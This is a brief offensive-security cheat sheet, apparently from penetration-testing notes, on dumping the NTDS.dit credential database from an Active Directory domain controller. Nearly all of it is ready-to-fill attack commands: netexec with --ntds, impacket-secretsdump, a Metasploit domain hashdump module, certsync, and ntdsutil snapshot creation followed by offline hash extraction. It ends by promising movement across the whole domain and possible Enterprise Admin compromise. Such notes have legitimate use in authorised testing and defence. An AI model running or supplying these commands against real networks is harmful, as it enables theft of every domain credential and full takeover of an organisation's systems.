# Dump NTDS from Domain Controller

## Tools: CrackMpaExec/Netexec , secretsdump , ntdsutil , metasploit , certsync

 - netexec smb DC_IP -u USER -p PASSWORD -d DOMAIN --ntds

 - impacket-secretsdump 'DOMAIN/USER:PASSWORD'@IP

 - windows/gather/credentials/domain_hashdump (Metasploit)

 - certsync -u USER -p PASSWORD -d DOMAIN -dc-ip DC_IP -ns NAMESERVER_IP

### NTDSUtil

 - ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q (On the DC)

 - impacket-secretsdump -ntds NTDS_FILE.dit -system SYSTEM_FILE -hashes LMHASH:NTHASH LOCAL -outputfile ntlm-extract

### With these techniques you can move everywhere within the entire domain, as well as possibly compromise the Enterprise Admin (in this case it's game over)
